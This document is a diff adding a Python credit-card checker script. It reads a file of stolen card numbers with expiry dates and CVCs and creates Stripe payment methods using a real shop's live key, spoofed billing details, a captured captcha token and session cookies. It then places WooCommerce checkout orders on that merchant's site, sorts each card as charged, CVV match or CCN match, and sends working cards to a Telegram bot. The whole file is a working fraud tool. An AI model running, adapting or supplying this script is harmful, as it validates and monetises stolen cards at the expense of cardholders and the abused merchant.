@@ -1,0 +1,88 @@
+import requests
+file=input('enter name combo: ')
+idtele=input('enter id telegram: ')
+tokentele=input('enter token bot: ')
+gg=open(file,'r')
+for gg in gg:
+	c = gg.strip().split('\n')[0]
+	cc = c.split('|')[0]
+	exp=c.split('|')[1]
+	ex=c.split('|')[2]
+	try:
+		exy=ex[2]+ex[3]
+		if '2' in ex[3] or '1' in ex[3]:
+			exy=ex[2]+'7'
+		else:pass
+	except:
+		exy=ex[0]+ex[1]
+		if '2' in ex[1] or '1' in ex[1]:
+			exy=ex[0]+'7'
+		else:pass
+	cvc=c.split('|')[3]
+
+	url = "https://api.stripe.com/v1/payment_methods"
+	
+	payload = f"type=card&billing_details%5Bname%5D=Jones+Jones&billing_details%5Baddress%5D%5Bline1%5D=New+York+City+State+Park&billing_details%5Baddress%5D%5Bstate%5D=NY&billing_details%5Baddress%5D%5Bcity%5D=New+York+&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Bemail%5D=aqga347%40gmail.com&billing_details%5Bphone%5D=12058809966&card%5Bnumber%5D={cc}&card%5Bcvc%5D={cvc}&card%5Bexp_month%5D={exp}&card%5Bexp_year%5D={exy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F9e321c785d%3B+stripe-js-v3%2F9e321c785d%3B+split-card-element&referrer=https%3A%2F%2Fsuprabars.com&time_on_page=18713&key=pk_live_uiXKihGf2YSS7oJWUmTJsEgs&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYa-oGp2nNUN7Fdb4wzb_4Adq_RkgXAxplQdzfeh7IatF25nuRr_SgsEldPGRZhXMsORozwV4_5IByKcvnBdYLXncljQLJDveLIPy0EdorpGxtXKeZoB3A4-dDERqiKSbogNQN7M2eUZeds6n9aUo0gbn5B7J-PE7FAE7vhy00yzwvgt9Togkr1t7fThkNLm7fCEq1R4t42vVF0k4yUc6kU_xOpSSyJ8P-l-8pMdtPIHUjF6I7qZrM1BGb9pAxAyupefn7HQWA239eOwybipPnQjXihSGJXGcogVsk-0o1Hd9wy_wp-pV5_Hx0tBIHEsxkHN3I08fAQNWGn7pXSuKH4cGYiyldYVrOcG8h3zP0O8bptfVimnVlyA6r9SOGoxys0i35viCsgaE2zWYkErdll2pLrsuxOz9FfWjBl_W9SAaeTGjX_Ob8YgMUWCAGJrPRqd8MnqHRA4PumbC6bhs-MJJbaT5zcvg1-p2dkQrNYSng67xU5s47WYMSmqxCqvYSeHnc538Hyz7s4qjB7ZxVPugXANMqAUKaso3iZa9wn5FyYBBvdcaFEfUobzMipR7f9AudDcOY1YZrO3qk215bj5s92kkAo6Xb-adU3ki01EQP1bUTszCPQYkAA1VBVXxvjsYP8KlLkkqzVeWiXfa8WsYFG22cCIGMjXKF6KvCcx8WeRCdGjY98ii60QWDdmwuUYDo8egYAsy__dvfThNZV7L_fT2GoE3Q_Slx-WAL_LOB_TcNJ2oohtopAtULdc10fAL-ORUWylTYxjuB_mXFu48QP9HmjigpwdH_0PVVazcUICQwUzg7sOrjKctk4NPlyB-x8a0EPTQsdy4zSt96UYmxZDU6gRNlsOkszE4s0NE2fzuHm-l_ATVZGlu5j6zkmAdL2P5h7iiIODsrRBB7NWTLntEBNJVUujldJuaWme4IqYfOI3bukkO-LSAunENkB8wIue0SmgKDKrViRJ0rgZFHaj357mepYsqTx-npBjLHvYTymuvCNNG-JR6-184mNV9htb30pcCEZ-9q3YQIn7Vf87ww4Lyzs-SaYnpbDnP-5d3BH_5x9EzOU59RLnZ-yml2c7kA52941IvzbXD_QGh_16vOjILfExIGFcNp_iERMvPknTPCjDhNYKfNmigxfYqZzTkId80U-nSf5Nbf9nytTEjMgB7joqzQQBZEmlrOnxwyI5DizJNujNzlVAagFiMc12lCOQnNDlJUrCo1TTf0z6thK1jAMFbBZS18Al1o2_Wy8EN3hysHNGBABymKV2BKzigoSBlpZc5iyeIYYFk_xkY31T1at1UTMBwvj8qZZwT7QvEmzWer1j2zuz77Yv6OEXFtKh2zj9BKuNh9YwdMVD5bwFU4u2FZCek99cOW2pX5Elr0vgx3h2ueXX2Ewdek4jElXChTFquYhC4DctOghk8-y7ke6bwcAd6B32Q678gWStXVli7l8pDr-JmZdddGnjumNJc02UzuNuxiiAogBZFnaNvNr9LHQwAuaFYSS7rYtgCUX21xFT89qQfjUwb9gB6WnPTNWikpJQ5L-7k_aMFoLTJQJr8fiwPJgPqVzRNOCgtDTetWDhd2dLzzSO3xccs349ZhEztLaKLkqk0o6dHA_VnqpFSy-JkUx4qDNFIc_IwIJtxxVO7kIxIsCjNuEoet8djf35CvbQvLXoGIWQPvbYQuR0_E9qrk88dmjZp-jlEU_szyR_dUjzD7jjJ8OF01_7V8Zycf4vLI5OylNbNOsjvoElNwOe527TEoQxZKVxz0hPQCaUoMbNImiynyC4DD_tBXeMr4mjYeNstEq6XIreuQxye7F3sFmwqetjUg4MmLrHxG5fxGYjWdUmAk925AKtYC193yX0uYAd7pvjWrRVTXfiLXQ5WOKGBuT1eoWa37jYA87gfC_PgWQ1Rsle_OUZO6tE1T81ZAIquh6kXlXpF-VqJk5WFflBbk2HfFtk3l4vTX5GfS06UF8CZRfJQUYXrAigunVfDB8sGucl3lhgFabBojdjqjkiX9pD40jydCd5Mv3cdYHLqWglrKxiXvpXPgrlvHpjbxRlA1chS8xAQXyltujZXhwzmYmAzeoc2hhcmRfaWTOAzGDb6JrcqgxOWE1YmNiYaJwZAA.8uWtk6w4ZyLiep2iGrXEatMuJ1wHageQS8w-pCOjqQE"
+	
+	headers = {
+	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+	  'Accept': "application/json",
+	  'Content-Type': "application/x-www-form-urlencoded",
+	  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+	  'sec-ch-ua-mobile': "?1",
+	  'sec-ch-ua-platform': "\"Android\"",
+	  'origin': "https://js.stripe.com",
+	  'sec-fetch-site': "same-site",
+	  'sec-fetch-mode': "cors",
+	  'sec-fetch-dest': "empty",
+	  'referer': "https://js.stripe.com/",
+	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
+	}
+	
+	response = requests.post(url, data=payload, headers=headers)
+	if 'id' in response.text:
+		id=(response.json()['id'])
+		
+		url = "https://suprabars.com"
+		
+		params = {
+		  'wc-ajax': "checkout"
+		}
+		
+		payload = "billing_email=aqga347%40gmail.com&billing_first_name=Jones&billing_last_name=Jones&billing_company=New+York+&billing_country=US&billing_address_1=New+York+City+State+Park&billing_address_2=&billing_city=New+York+&billing_state=NY&billing_postcode=10080&billing_phone=12058809966&order_comments=&wc_order_attribution_source_type=organic&wc_order_attribution_referrer=https%3A%2F%2Fwww.google.com%2F&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=google&wc_order_attribution_utm_medium=organic&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fsuprabars.com%2Fproduct-category%2Fmerchandise%2F%3Forderby%3Drating&wc_order_attribution_session_start_time=2024-04-22+06%3A24%3A23&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&payment_method=stripe&woocommerce-process-checkout-nonce=5f46f855e0&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source="+id
+		
+		headers = {
+		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+		  'Accept': "application/json, text/javascript, */*; q=0.01",
+		  'Content-Type': "application/x-www-form-urlencoded",
+		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+		  'x-requested-with': "XMLHttpRequest",
+		  'sec-ch-ua-mobile': "?1",
+		  'sec-ch-ua-platform': "\"Android\"",
+		  'origin': "https://suprabars.com",
+		  'sec-fetch-site': "same-origin",
+		  'sec-fetch-mode': "cors",
+		  'sec-fetch-dest': "empty",
+		  'referer': "https://suprabars.com/checkout/",
+		  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+		  'Cookie': "sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2024-04-22%2006%3A23%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fsuprabars.com%2Fproduct-category%2Fmerchandise%2F%3Forderby%3Drating%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.444234758.1713767033; sbjs_current_add=fd%3D2024-04-22%2006%3A24%3A23%7C%7C%7Cep%3Dhttps%3A%2F%2Fsuprabars.com%2Fproduct-category%2Fmerchandise%2F%3Forderby%3Drating%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; wp_woocommerce_session_4a060672015d89d5dd060a90ea5ee752=t_d4b256c1c85c2a80c3bd61ba92a66c%7C%7C1713939869%7C%7C1713936269%7C%7C195e61398bd4e3caf015a3431b377699; woocommerce_items_in_cart=1; woocommerce_cart_hash=c13752a37e85029bb06e6b57247366b5; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsuprabars.com%2Fcheckout%2F; _ga_82QYJYWGXK=GS1.1.1713767032.1.1.1713767112.0.0.0"
+		}
+		
+		text = requests.post(url, params=params, data=payload, headers=headers).text
+		
+		if "card was declined" in text or 'card_declined' in text or 'The transaction has been declined' in text or 'Processor Declined' in text:
+			print(f'{c}|You Card Declined')
+		elif 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
+			print(f'{c}|CVV MATCH ✅')
+			requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text={c}|CVV MATCH❎")
+		elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
+			print(f'{c}|CCN MATCH ✅')
+			requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text={c}|CCN MATCH ❎")
+		elif 'Donation Confirmation' in text or "This page doesn't seem to exist" in text or 'seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
+			print(f'{c}|CHARGE ✅')
+			requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text={c}|CHARGE ✅")
+		else:
+			print(f'{c}|You Card Declined')
+			
+	else:
+		print(f'{c}|You Card Declined')
